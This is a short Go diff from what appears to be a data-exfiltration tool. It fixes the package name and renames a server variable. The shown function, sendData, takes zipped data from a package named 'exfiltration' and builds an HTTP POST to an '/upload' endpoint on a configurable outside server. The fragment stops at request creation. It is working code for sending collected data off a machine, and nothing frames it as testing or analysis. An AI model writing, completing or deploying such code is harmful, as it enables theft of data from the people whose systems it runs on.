@@ -1,4 +1,4 @@
-package mian
+package main
 
 import (
 	"net/http"
@@ -7,12 +7,12 @@ import (
 	"bytes"
 	"fmt"
 )
-var serverIP string
+var server string
 
 
 func sendData() {
 	
-	url := fmt.Sprintf("%s/upload", serverIP)
+	url := fmt.Sprintf("%s/upload", server)
 	data := exfiltration.MakeZip()
 	
 	req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
